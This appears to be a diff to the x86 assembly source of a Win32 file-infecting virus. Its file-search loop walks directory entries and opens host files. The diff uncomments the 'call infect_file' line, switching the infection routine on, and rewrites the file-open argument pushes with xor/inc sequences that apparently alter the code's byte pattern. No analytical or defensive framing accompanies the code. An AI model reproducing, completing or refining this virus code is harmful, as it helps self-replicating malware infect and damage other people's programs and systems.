@@ -136,7 +136,7 @@ find_next_file:
 	cmp eax,0
 	je done_find
 	mov dword ptr[ebp+search_handle],eax
-	;call infect_file
+	call infect_file
 	lea eax,[ebp+win32_find_data.FileName]
 	xor eax,eax
 	lea eax,[ebp+ offset win32_find_data]
@@ -171,11 +171,13 @@ open_fail:
 get_host_data:
  	;;
 open_file:
-    	push 0h 
-    	push 80h
-    	push 3h
-   	push 0h 
-    	push 01h
+	xor eax,eax
+	push eax
+    	push eax
+    	push 00000003h
+   	push eax
+   	inc eax
+    	push eax
    	push 80000000h
     	lea eax,[ebp+win32_find_data.FileName] 
     	add eax,ebx
